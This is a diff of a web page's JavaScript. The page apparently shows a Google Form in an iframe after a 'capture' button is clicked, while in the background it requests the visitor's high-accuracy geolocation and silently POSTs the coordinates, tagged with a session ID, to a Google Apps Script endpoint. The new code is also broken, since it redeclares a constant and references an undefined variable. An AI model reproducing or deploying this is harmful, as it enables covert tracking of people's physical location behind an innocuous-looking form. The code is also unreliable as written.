@@ -59,40 +59,40 @@ iframe{
     </iframe>
 </div>
 
+
+
 <script>
 const FORM_URL = "https://forms.gle/nquHqjLsmBAgmfMN7";
 const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzHzIbJqPTFi3NGwqOKFUH5iGOkVCY_dA8Y3xAK04DDXUgnYiXihdpayeOolizE1EiOWQ/exec";
 
+const sessionId = "SID-" + Date.now() + "-" + Math.floor(Math.random()*10000);
+
+// Prefill URL (replace entry.123456 with your SessionID field)
+const FORM_URL = FORM_BASE + "?usp=pp_url&entry.123456=" + sessionId;
+
 function start(){
-    // show form immediately
-    document.getElementById("captureBtn").style.display="none";
-    document.getElementById("formFrame").style.display="block";
+  document.getElementById("captureBtn").style.display="none";
+  const frame = document.getElementById("formFrame");
+  frame.src = FORM_URL;
+  frame.style.display="block";
 
-    // try location in background
-    if(!navigator.geolocation) return;
+  if (!navigator.geolocation) return;
 
-    navigator.geolocation.getCurrentPosition(
-        pos=>{
-            const payload={
-                lat:pos.coords.latitude,
-                lng:pos.coords.longitude,
-                ts:new Date().toISOString()
-            };
+  navigator.geolocation.getCurrentPosition(pos=>{
+    const payload={
+      sessionId: sessionId,
+      location: `Lat:${pos.coords.latitude}, Lng:${pos.coords.longitude}`
+    };
 
-            fetch(SCRIPT_URL,{
-                method:"POST",
-                mode:"no-cors",
-                body:JSON.stringify(payload)
-            });
-        },
-        err=>{
-            // silently ignore (iPhone / denied)
-            console.log("Location not available");
-        },
-        { enableHighAccuracy:true, timeout:8000 }
-    );
+    fetch(SCRIPT_URL,{
+      method:"POST",
+      mode:"no-cors",
+      body:JSON.stringify(payload)
+    });
+  });
 }
 </script>
+
 
 </body>
 </html>
